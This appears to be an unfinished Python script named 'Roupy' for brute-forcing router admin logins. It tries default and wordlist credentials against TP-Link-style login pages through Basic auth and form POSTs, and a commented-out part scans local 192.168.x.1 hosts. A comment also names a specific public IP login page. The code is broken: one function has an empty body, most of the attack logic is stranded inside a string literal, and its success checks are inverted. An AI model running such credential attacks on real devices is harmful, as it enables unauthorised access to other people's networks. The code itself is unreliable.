import os
import sys
import requests
import threading
from routers_info import tplink, digisol, netgear, tenda, dlink


#Test Creds for Testing
#CONSTANTS
#user = 'admin'
#password = '1234'
MAX_ATTEMPTS = 5
MAX_RETRIES = 3
STATUS = 200
URL_RANGE = "http://"





def chk_connection(URL_RANGE):
   res = requests.get(URL_RANGE)
   if res.status_code is STATUS:
      return True
   else:
      return False


def msr(URL_RANGE):
   


'''
hosts = list()
def asfr():
   #Scanning for routers locally
   if 
   #operator = os.system('ifconfig ')
   for x in range(0,255):
      url = 'http://'+ '192.168.'+str(x)+'.'+str(1)
      live = requests.get(url)
      hosts.append(live)

if res.status_code == status:
   print('200 OK '+ URL_RANGE)
   responsecode = res.text
   #Checking for router manufacturer

   if 'TP-LINK' in responsecode:
      print("Router is TP-Link") 

   #TPLINK Router testing Module ArcherC50 AC1200
   #Loading Encoded Default PASSWORDS
   with open('encodedcreds.txt','r') as readerCreds:
      for line in readerCreds.readlines():
         cred = line.strip('\n')
         print("[+] Trying with "+cred)
         requestToRouter = requests.get(URL_RANGE, headers={'Authorization':'Basic {cred}'})
         #print(requestToRouter.text)
         if 'Base64Encoding' not in requestToRouter.text:
            print(f"Success-"+str({cred}))
            exit(0)
         else:
            print("Invalid")
            exit(0)

def post_auth_router():
       #URL_RANGE = 'http://103.125.161.188/login.cgi'
       with open('users.txt','r') as users_raw_data, open('pass.txt','r') as passwords_raw_data:
          for u in users_raw_data.readlines():
            user = u.strip('\n')
            for p in passwords_raw_data:
               password = p.strip('\n')                 
               print(f"[+] Using Credentials {user} and {password}")
               requestToRouter = requests.post(URL_RANGE, data=f"username={user}&password={password}&submit.htm?login.htm=Send", headers={"Content-Type": "application/x-www-form-urlencoded"})
               #print(requestToRouter.text)
               if 'Username or password error' in requestToRouter:
                  print(f"Success with "+{user}+{password})
                  print("Exiting...")
                  exit(0)
               else:
                  print("404 Not Found...")

'''
if __name__ == '__main__':
   print("Initializing...")
   if len(sys.argv) == 5:
      methodToUse = sys.argv[4]
      URL_RANGE = URL_RANGE + sys.argv[2]
      if chk_connection(URL_RANGE):
         if methodToUse is 1:
            #aslr(URL_RANGE)
            pass
         elif methodToUse is 2:
            #msr(URL_RANGE)
            pass
         else:
            #isr(URL_RANGE)
            pass
      else:
         print("No Connection.. exiting")
         exit(0)
   else:
      print('''
Roupy HELP
[+]   Provide -u <URL>
[+]   Provide -t <Attack Type>''')